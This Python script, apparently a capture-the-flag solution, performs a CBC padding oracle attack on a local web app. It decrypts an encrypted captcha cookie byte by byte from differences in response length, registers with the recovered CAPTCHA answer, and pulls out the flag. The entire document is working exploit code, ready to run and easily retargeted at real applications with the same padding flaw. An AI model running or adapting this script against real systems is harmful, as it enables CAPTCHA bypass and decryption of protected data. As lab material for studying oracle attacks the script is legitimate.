import requests
import base64
import re
from typing import Tuple

TARGET_URL = "http://127.0.0.1:32869/"

def fetch_fresh_session() -> Tuple[bytes, str, str, str]:
    """Fetch a fresh session and extract captcha cookie, csrf_token, and session cookie."""
    print("[*] Fetching fresh session...")
    response = requests.get(TARGET_URL, timeout=10)
    
    captcha_cookie = response.cookies.get('captcha')
    session_cookie = response.cookies.get('session')
    
    print(f"[+] Captcha cookie: {captcha_cookie[:40]}...")
    print(f"[+] Session cookie: {session_cookie[:40]}...")
    
    captcha_bytes = base64.b64decode(captcha_cookie)
    print(f"[+] Captcha bytes (hex): {captcha_bytes.hex()}")
    print(f"[+] Length: {len(captcha_bytes)} bytes")
    
    match = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', response.text)
    csrf_token = match.group(1) if match else None
    print(f"[+] CSRF token: {csrf_token}")
    
    return captcha_bytes, csrf_token, session_cookie, captcha_cookie

def oracle_test(iv: bytes, ciphertext: bytes, session: str, captcha_b64: str) -> int:
    """Test padding validity via response length."""
    full = base64.b64encode(iv + ciphertext).decode()
    
    try:
        r = requests.post(
            TARGET_URL,
            data={'username': 'x', 'captcha': 'x', 'csrf_token': 'x', 'submit': 'Register'},
            cookies={'session': session, 'captcha': full},
            timeout=3
        )
        return len(r.content)
    except:
        return -1

def decrypt_block(iv: bytes, ct: bytes, session: str, captcha_b64: str) -> bytes:
    """Decrypt block using padding oracle."""
    plaintext = bytearray(16)
    intermediate = bytearray(16)
    
    print(f"\n[*] Decrypting block...")
    print(f"[*] IV: {iv.hex()}")
    print(f"[*] CT: {ct.hex()}")
    
    for pad in range(1, 17):
        pos = 16 - pad
        print(f"\n[*] Byte {pos} (pad={pad})")
        
        test_iv = bytearray(iv)
        for k in range(1, pad):
            test_iv[16 - k] = intermediate[16 - k] ^ pad
        
        baseline = oracle_test(bytes(iv), ct, session, captcha_b64)
        found = False
        
        # Try common padding values first for optimization
        attempts = list(range(1, 17)) + [i for i in range(256) if i not in range(1, 17)]
        
        for guess in attempts:
            test_iv[pos] = guess
            length = oracle_test(bytes(test_iv), ct, session, captcha_b64)
            
            if length != baseline and length > 0:
                intermediate[pos] = guess ^ pad
                plaintext[pos] = intermediate[pos] ^ iv[pos]
                
                char = chr(plaintext[pos]) if 32 <= plaintext[pos] < 127 else '?'
                print(f"[+] Found: 0x{plaintext[pos]:02x} ('{char}')")
                found = True
                break
        
        if not found:
            intermediate[pos] = iv[pos] ^ pad
            plaintext[pos] = pad
            print(f"[*] Fallback: 0x{plaintext[pos]:02x}")
        
        if pad % 4 == 0:
            partial = plaintext[pos:].hex()
            ascii_part = ''.join(chr(b) if 32 <= b < 127 else '?' for b in plaintext[pos:])
            print(f"[*] Progress: {partial} ('{ascii_part}')")
    
    return bytes(plaintext)

def remove_padding(data: bytes) -> bytes:
    """Remove PKCS7 padding."""
    if not data:
        return data
    pad_val = data[-1]
    if pad_val > len(data) or pad_val == 0:
        return data
    if all(data[-(i+1)] == pad_val for i in range(pad_val)):
        return data[:-pad_val]
    return data

print("="*60)
print("PADDING ORACLE ATTACK")
print("="*60)

# Fetch session
captcha_bytes, csrf, session, captcha_b64 = fetch_fresh_session()

if len(captcha_bytes) != 32:
    print(f"[!] Unexpected length: {len(captcha_bytes)}")

# Parse structure
iv = captcha_bytes[:16]
ciphertext = captcha_bytes[16:]

# Decrypt
plaintext_padded = decrypt_block(iv, ciphertext, session, captcha_b64)
print(f"\n[+] Decrypted (padded): {plaintext_padded.hex()}")
print(f"[+] Raw bytes: {plaintext_padded}")

plaintext = remove_padding(plaintext_padded)
print(f"[+] Decrypted (unpadded): {plaintext.hex()}")

solution = plaintext.decode('utf-8', errors='ignore').strip()
print(f"[+] CAPTCHA solution: '{solution}'")

# Register
print(f"\n[*] Registering with solution...")
cookies = {'session': session, 'captcha': captcha_b64}
data = {
    'username': 'hacker123',
    'captcha': solution,
    'csrf_token': csrf,
    'submit': 'Register'
}

response = requests.post(TARGET_URL, data=data, cookies=cookies)
print(f"[+] Status: {response.status_code}")
print(f"[+] Response:\n{response.text}")

# Extract flag
flag = re.search(r'FLAG\{[^}]+\}', response.text)
if flag:
    print(f"\n{'='*60}")
    print(f"[!!!] FLAG: {flag.group(0)}")
    print(f"{'='*60}")
else:
    print("\n[!] No flag found")

